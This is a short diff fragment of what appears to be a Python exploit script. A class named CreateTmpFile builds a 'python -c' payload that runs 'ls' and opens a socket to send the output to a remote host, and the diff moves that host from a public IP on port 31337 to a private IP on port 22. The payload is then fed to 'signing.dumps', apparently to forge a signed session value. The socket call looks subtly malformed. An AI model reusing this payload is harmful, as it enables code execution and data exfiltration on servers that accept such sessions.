@@ -16,7 +16,7 @@ class CreateTmpFile(object):
                   '-c',
                   'import os,socket;c=os.popen("ls").read().strip();'
                   's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
-                  's.connect(c,("103.224.82.158",31337));'],))
+                  's.connect(c,("192.168.139.129",22));'],))
 
 
 sess = signing.dumps(
